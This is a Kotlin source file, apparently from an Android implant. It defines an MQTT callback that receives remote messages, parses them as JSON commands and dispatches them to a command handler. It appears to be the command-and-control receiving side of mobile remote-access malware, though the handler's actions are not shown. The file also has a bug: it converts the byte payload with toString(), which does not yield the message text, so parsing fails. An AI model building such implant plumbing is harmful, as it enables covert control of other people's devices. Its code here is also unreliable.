package com.cooperthecoder.implant.command

import android.content.Context
import android.util.Log
import org.eclipse.paho.android.service.MqttAndroidClient
import org.eclipse.paho.client.mqttv3.IMqttDeliveryToken
import org.eclipse.paho.client.mqttv3.MqttCallback
import org.eclipse.paho.client.mqttv3.MqttMessage

class CommandMqttMessageCallback(val client: MqttAndroidClient, context: Context) : MqttCallback {

    companion object {
        val TAG: String = CommandMqttMessageCallback::class.java.name
    }

    val context: Context = context.applicationContext

    override fun messageArrived(topic: String, message: MqttMessage) {
        val text = message.payload.toString()
        val command: Command = try {
            Command.fromJson(text)
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing JSON from: $text.", e)
            e.printStackTrace()
            return
        }
        val commandHandler = CommandHandler(context, command, client)
        commandHandler.handle()
    }

    override fun connectionLost(cause: Throwable) {
        cause.printStackTrace()
    }

    override fun deliveryComplete(token: IMqttDeliveryToken) {
        Log.d(TAG, "Delivery completed")
    }

}